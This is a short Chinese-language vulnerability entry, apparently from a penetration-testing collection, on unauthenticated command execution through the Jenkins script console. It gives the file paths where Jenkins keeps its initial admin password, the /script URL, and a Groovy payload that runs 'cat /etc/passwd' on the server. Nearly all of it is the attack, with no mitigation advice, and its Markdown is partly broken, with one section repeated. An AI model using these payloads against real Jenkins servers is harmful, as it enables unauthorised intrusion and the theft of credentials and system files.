# Jenkins script 未授权远程命令执行漏洞

## 漏洞描述
Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
账号密码存在于：

```
Linux: /var/lib/jenkins/secrets/initialAdminPassword
Windows: C:\Users\RabbitMask\.jenkins\secrets\initialAdminPassword
```

登录后台，或在未授权的情况下访问

```

## Payloads
```
Linux: /var/lib/jenkins/secrets/initialAdminPassword
Windows: C:\Users\RabbitMask\.jenkins\secrets\initialAdminPassword
```
```
http://xxx.xxx.xxx.xxx/script
```
```
println "cat /etc/passwd".execute().text
```
